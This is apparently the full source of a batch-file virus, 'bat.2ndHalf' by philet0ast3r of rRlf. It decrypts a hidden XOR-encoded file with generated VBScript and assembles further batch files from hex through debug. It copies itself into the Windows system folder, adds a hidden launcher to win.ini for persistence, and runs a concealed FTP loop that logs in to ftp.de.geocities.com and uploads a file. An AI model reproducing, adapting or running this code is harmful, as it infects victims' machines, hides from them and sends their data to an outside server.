@echo off

:: bat.2ndHalf
:: by philet0ast3r [rRlf]
:: contains the 2ndHalf of my best payload:
:: the first ever two virii talking to each other
:: bat.wtf contains a encrypted part, that get's stored on the hd
:: bat.2ndHalf decrypts this part, and brings the rest for the viral conversation to work
:: finished: never

ctty nul
if not exist c:\ww goto tr
cd %winbootdir%
echo.on error resume next>c
echo set fso = createobject("scripting.filesystemobject")>>c
echo set proc4 = fso.opentextfile("c:\ww", 1)>>c
echo msg = proc4.readall>>c
echo ddd = x(msg)>>c
echo set proc2 = fso.createtextfile("c:\ww", true)>>c
echo proc2.writeline ddd>>c
echo proc2.close>>c
echo Function x(sText)>>c
echo.On Error Resume Next>>c
echo Dim ekey, i, hash, crbyte>>c
echo ekey = 135>>c
echo For i = 1 To Len(sText)>>c
echo hash = Asc(Mid(sText, i, 1))>>c
echo crbyte = Chr(hash Xor (ekey Mod 255))>>c
echo x = x & crbyte>>c
echo Next>>c
echo End Function>>c
ren c c.vbs
start /w c.vbs
move c:\ww %winbootdir%\ww.bat
echo e 0100 65 63 68 6F 20 40 65 63 68 6F 20 6F 66 66 3E 61>s
echo e 0110 0D 0A 65 63 68 6F 20 63 61 6C 6C 20 72 2E 62 61>>s
echo e 0120 74 3E 3E 61 0D 0A 65 63 68 6F 20 69 66 20 65 78>>s
echo e 0130 69 73 74 20 31 2E 72 72 20 65 63 68 6F 20 62 61>>s
echo e 0140 74 2E 32 6E 64 48 61 6C 66 3A 20 49 27 6D 20 66>>s
echo e 0150 69 6E 65 2E 20 57 68 61 74 20 61 62 6F 75 74 20>>s
echo e 0160 79 6F 75 3F 3E 3E 61 0D 0A 65 63 68 6F 20 69 66>>s
echo e 0170 20 65 78 69 73 74 20 32 2E 72 72 20 65 63 68 6F>>s
echo e 0180 20 62 61 74 2E 32 6E 64 48 61 6C 66 3A 20 57 65>>s
echo e 0190 6C 6C 2C 20 69 74 27 73 20 61 20 62 69 74 20 62>>s
echo e 01A0 6F 72 69 6E 67 20 68 65 72 65 20 2E 2E 2E 20 57>>s
echo e 01B0 68 61 74 20 61 62 6F 75 74 20 79 6F 75 3F 3E 3E>>s
echo e 01C0 61 0D 0A 65 63 68 6F 20 69 66 20 65 78 69 73 74>>s
echo e 01D0 20 33 2E 72 72 20 65 63 68 6F 20 62 61 74 2E 32>>s
echo e 01E0 6E 64 48 61 6C 66 3A 20 49 27 6D 20 6F 6B 2E 20>>s
echo e 01F0 48 6F 77 20 61 72 65 20 79 6F 75 3F 3E 3E 61 0D>>s
echo e 0200 0A 65 63 68 6F 20 64 65 6C 20 2A 2E 72 72 3E 3E>>s
echo e 0210 61 0D 0A 65 63 68 6F 20 63 68 6F 69 63 65 20 2F>>s
echo e 0220 63 3A 2E 20 2F 6E 20 2F 74 3A 2E 2C 30 32 3E 3E>>s
echo e 0230 61 0D 0A 65 63 68 6F 20 63 61 6C 6C 20 62 2E 62>>s
echo e 0240 61 74 3E 3E 61 0D 0A 72 65 6E 20 61 20 61 2E 62>>s
echo e 0250 61 74 0D 0A 65 63 68 6F 20 40 65 63 68 6F 20 6F>>s
echo e 0260 66 66 3E 63 0D 0A 65 63 68 6F 20 63 61 6C 6C 20>>s
echo e 0270 72 2E 62 61 74 3E 3E 63 0D 0A 65 63 68 6F 20 69>>s
echo e 0280 66 20 65 78 69 73 74 20 31 2E 72 72 20 65 63 68>>s
echo e 0290 6F 20 62 61 74 2E 32 6E 64 48 61 6C 66 3A 20 44>>s
echo e 02A0 69 64 20 79 6F 75 20 65 6E 63 6F 75 6E 74 65 72>>s
echo e 02B0 20 61 6E 79 20 61 76 3F 3E 3E 63 0D 0A 65 63 68>>s
echo e 02C0 6F 20 69 66 20 65 78 69 73 74 20 32 2E 72 72 20>>s
echo e 02D0 65 63 68 6F 20 62 61 74 2E 32 6E 64 48 61 6C 66>>s
echo e 02E0 3A 20 44 69 64 20 79 6F 75 20 68 61 76 65 20 61>>s
echo e 02F0 6E 79 20 70 72 6F 62 6C 65 6D 73 20 77 69 74 68>>s
echo e 0300 20 74 68 6F 73 65 20 61 76 20 73 75 78 30 72 73>>s
echo e 0310 3F 3E 3E 63 0D 0A 65 63 68 6F 20 69 66 20 65 78>>s
echo e 0320 69 73 74 20 33 2E 72 72 20 65 63 68 6F 20 62 61>>s
echo e 0330 74 2E 32 6E 64 48 61 6C 66 3A 20 44 69 64 20 79>>s
echo e 0340 6F 75 20 73 65 65 20 61 6E 79 20 61 76 20 72 65>>s
echo e 0350 63 65 6E 74 6C 79 3F 3E 3E 63 0D 0A 65 63 68 6F>>s
echo e 0360 20 64 65 6C 20 2A 2E 72 72 3E 3E 63 0D 0A 65 63>>s
echo e 0370 68 6F 20 63 68 6F 69 63 65 20 2F 63 3A 2E 20 2F>>s
echo e 0380 6E 20 2F 74 3A 2E 2C 30 32 3E 3E 63 0D 0A 65 63>>s
echo e 0390 68 6F 20 63 61 6C 6C 20 64 2E 62 61 74 3E 3E 63>>s
echo e 03A0 0D 0A 72 65 6E 20 63 20 63 2E 62 61 74 0D 0A 65>>s
echo e 03B0 63 68 6F 20 40 65 63 68 6F 20 6F 66 66 3E 65 0D>>s
echo e 03C0 0A 65 63 68 6F 20 63 61 6C 6C 20 72 2E 62 61 74>>s
echo e 03D0 3E 3E 65 0D 0A 65 63 68 6F 20 69 66 20 65 78 69>>s
echo e 03E0 73 74 20 31 2E 72 72 20 65 63 68 6F 20 62 61 74>>s
echo e 03F0 2E 32 6E 64 48 61 6C 66 3A 20 48 65 68 65 2C 20>>s
echo e 0400 73 61 6D 65 20 68 65 72 65 2E 3E 3E 65 0D 0A 65>>s
echo e 0410 63 68 6F 20 69 66 20 65 78 69 73 74 20 32 2E 72>>s
echo e 0420 72 20 65 63 68 6F 20 62 61 74 2E 32 6E 64 48 61>>s
echo e 0430 6C 66 3A 20 4E 6F 2C 20 64 69 64 6E 27 74 20 73>>s
echo e 0440 65 65 20 61 6E 79 2C 20 74 6F 6F 2E 3E 3E 65 0D>>s
echo e 0450 0A 65 63 68 6F 20 69 66 20 65 78 69 73 74 20 33>>s
echo e 0460 2E 72 72 20 65 63 68 6F 20 62 61 74 2E 32 6E 64>>s
echo e 0470 48 61 6C 66 3A 20 49 20 6D 65 74 20 6F 6E 65 20>>s
echo e 0480 6C 61 73 74 20 74 69 6D 65 20 2E 2E 2E 20 50 68>>s
echo e 0490 75 63 6B 69 6E 20 61 73 73 68 6F 6C 65 20 6E 65>>s
echo e 04A0 61 72 6C 79 20 6B 69 6C 6C 65 64 20 6D 65 2E 3E>>s
echo e 04B0 3E 65 0D 0A 65 63 68 6F 20 64 65 6C 20 2A 2E 72>>s
echo e 04C0 72 3E 3E 65 0D 0A 65 63 68 6F 20 63 68 6F 69 63>>s
echo e 04D0 65 20 2F 63 3A 2E 20 2F 6E 20 2F 74 3A 2E 2C 30>>s
echo e 04E0 32 3E 3E 65 0D 0A 65 63 68 6F 20 63 61 6C 6C 20>>s
echo e 04F0 66 2E 62 61 74 3E 3E 65 0D 0A 72 65 6E 20 65 20>>s
echo e 0500 65 2E 62 61 74 0D 0A 65 63 68 6F 20 40 65 63 68>>s
echo e 0510 6F 20 6F 66 66 3E 67 0D 0A 65 63 68 6F 20 63 61>>s
echo e 0520 6C 6C 20 72 2E 62 61 74 3E 3E 67 0D 0A 65 63 68>>s
echo e 0530 6F 20 69 66 20 65 78 69 73 74 20 31 2E 72 72 20>>s
echo e 0540 65 63 68 6F 20 62 61 74 2E 32 6E 64 48 61 6C 66>>s
echo e 0550 3A 20 48 65 68 65 68 65 2C 20 67 6F 6F 64 20 69>>s
echo e 0560 64 65 61 21 3E 3E 67 0D 0A 65 63 68 6F 20 69 66>>s
echo e 0570 20 65 78 69 73 74 20 32 2E 72 72 20 65 63 68 6F>>s
echo e 0580 20 62 61 74 2E 32 6E 64 48 61 6C 66 3A 20 4D 65>>s
echo e 0590 20 74 6F 6F 20 3A 5D 3E 3E 67 0D 0A 65 63 68 6F>>s
echo e 05A0 20 69 66 20 65 78 69 73 74 20 33 2E 72 72 20 65>>s
echo e 05B0 63 68 6F 20 62 61 74 2E 32 6E 64 48 61 6C 66 3A>>s
echo e 05C0 20 49 20 74 68 69 6E 6B 20 49 27 6C 6C 20 74 61>>s
echo e 05D0 6B 65 20 61 20 6E 61 70 2E 3E 3E 67 0D 0A 65 63>>s
echo e 05E0 68 6F 20 64 65 6C 20 2A 2E 72 72 3E 3E 67 0D 0A>>s
echo e 05F0 65 63 68 6F 20 63 68 6F 69 63 65 20 2F 63 3A 2E>>s
echo e 0600 20 2F 6E 20 2F 74 3A 2E 2C 30 32 3E 3E 67 0D 0A>>s
echo e 0610 65 63 68 6F 20 63 61 6C 6C 20 68 2E 62 61 74 3E>>s
echo e 0620 3E 67 0D 0A 72 65 6E 20 67 20 67 2E 62 61 74 0D>>s
echo e 0630 0A 65 63 68 6F 20 40 65 63 68 6F 20 6F 66 66 3E>>s
echo e 0640 69 0D 0A 65 63 68 6F 20 63 61 6C 6C 20 72 2E 62>>s
echo e 0650 61 74 3E 3E 69 0D 0A 65 63 68 6F 20 69 66 20 65>>s
echo e 0660 78 69 73 74 20 31 2E 72 72 20 65 63 68 6F 20 62>>s
echo e 0670 61 74 2E 32 6E 64 48 61 6C 66 3A 20 42 79 65 2E>>s
echo e 0680 3E 3E 69 0D 0A 65 63 68 6F 20 69 66 20 65 78 69>>s
echo e 0690 73 74 20 32 2E 72 72 20 65 63 68 6F 20 62 61 74>>s
echo e 06A0 2E 32 6E 64 48 61 6C 66 3A 20 43 20 55 3E 3E 69>>s
echo e 06B0 0D 0A 65 63 68 6F 20 69 66 20 65 78 69 73 74 20>>s
echo e 06C0 33 2E 72 72 20 65 63 68 6F 20 62 61 74 2E 32 6E>>s
echo e 06D0 64 48 61 6C 66 3A 20 48 61 77 61 64 65 72 65 20>>s
echo e 06E0 3A 29 3E 3E 69 0D 0A 65 63 68 6F 20 63 74 74 79>>s
echo e 06F0 20 6E 75 6C 3E 3E 69 0D 0A 65 63 68 6F 20 64 65>>s
echo e 0700 6C 20 2A 2E 72 72 3E 3E 69 0D 0A 65 63 68 6F 20>>s
echo e 0710 64 65 6C 20 30 2E 62 61 74 3E 3E 69 0D 0A 65 63>>s
echo e 0720 68 6F 20 64 65 6C 20 61 2E 62 61 74 3E 3E 69 0D>>s
echo e 0730 0A 65 63 68 6F 20 64 65 6C 20 62 2E 62 61 74 3E>>s
echo e 0740 3E 69 0D 0A 65 63 68 6F 20 64 65 6C 20 63 2E 62>>s
echo e 0750 61 74 3E 3E 69 0D 0A 65 63 68 6F 20 64 65 6C 20>>s
echo e 0760 64 2E 62 61 74 3E 3E 69 0D 0A 65 63 68 6F 20 64>>s
echo e 0770 65 6C 20 65 2E 62 61 74 3E 3E 69 0D 0A 65 63 68>>s
echo e 0780 6F 20 64 65 6C 20 66 2E 62 61 74 3E 3E 69 0D 0A>>s
echo e 0790 65 63 68 6F 20 64 65 6C 20 67 2E 62 61 74 3E 3E>>s
echo e 07A0 69 0D 0A 65 63 68 6F 20 64 65 6C 20 68 2E 62 61>>s
echo e 07B0 74 3E 3E 69 0D 0A 65 63 68 6F 20 64 65 6C 20 72>>s
echo e 07C0 2E 62 61 74 3E 3E 69 0D 0A 65 63 68 6F 20 64 65>>s
echo e 07D0 6C 20 63 2E 76 62 73 3E 3E 69 0D 0A 65 63 68 6F>>s
echo e 07E0 20 64 65 6C 20 73 74 61 72 74 2E 62 61 74 3E 3E>>s
echo e 07F0 69 0D 0A 65 63 68 6F 20 64 65 6C 20 77 77 2E 62>>s
echo e 0800 61 74 3E 3E 69 0D 0A 65 63 68 6F 20 64 65 6C 20>>s
echo e 0810 69 2E 62 61 74 3E 3E 69 0D 0A 72 65 6E 20 69 20>>s
echo e 0820 69 2E 62 61 74 0D 0A 63 74 74 79 20 63 6F 6E 0D>>s
echo e 0830 0A 65 63 68 6F 20 62 61 74 2E 32 6E 64 48 61 6C>>s
echo e 0840 66 3A 20 48 69 21 20 3A 29 0D 0A 65 63 68 6F 2E>>s
echo e 0850 0D 0A 63 61 6C 6C 20 30 2E 62 61 74>>s
echo rcx>>s
echo 075C>>s
echo n snd.hlf>>s
echo w>>s
echo q>>s
debug<s
del s
call ww.bat
:tr
on error resume next>s
createobject("wscript.shell").run "%winbootdir%\system\bat.2ndHalf.bat",vbhide>>s
move s %winbootdir%\system\s.vbs
copy %0 %winbootdir%\system\bat.2ndHalf.bat
echo [windows]>w
echo load=%winbootdir%\system\s.vbs>>w
echo run=>>w
echo NullPort=None>>w
echo.>>w
copy w + %winbootdir%\win.ini %winbootdir%\system\win.ini
del %winbootdir%\win.ini
move %winbootdir%\system\win.ini %winbootdir%\win.ini
del w
echo batsndhalf>f
echo password>>f
echo send [file]>>f
echo quit>>f
move f %winbootdir%\ptf
echo batsndhalf>ok
echo password>>ok
echo get ok.html>>ok
echo quit>>ok
move ok %winbootdir%\ok
echo @echo off>ul
echo :wait>>ul
echo choice /c:r /n /t:r,60>>ul
echo choice /c:r /n /t:r,60>>ul
echo choice /c:r /n /t:r,60>>ul
echo choice /c:r /n /t:r,60>>ul
echo choice /c:r /n /t:r,60>>ul
echo ftp -s:%winbootdir%\ok ftp.de.geocities.com>>ul
echo if not exist ok.html goto wait>>ul
echo ftp -s:%winbootdir%\ptf ftp.de.geocities.com>>ul
echo del ok.html>>ul
echo del %winbootdir%\ptf>>ul
echo del %winbootdir%\ok>>ul
echo cls>>ul
echo ctty nul>>ul
move ul %winbootdir%\system\ul.bat
echo on error resume next>t
echo createobject("wscript.shell").run "%winbootdir%\system\ul.bat",vbhide>>t
move t %winbootdir%\system\t.vbs
start %winbootdir%\system\t.vbs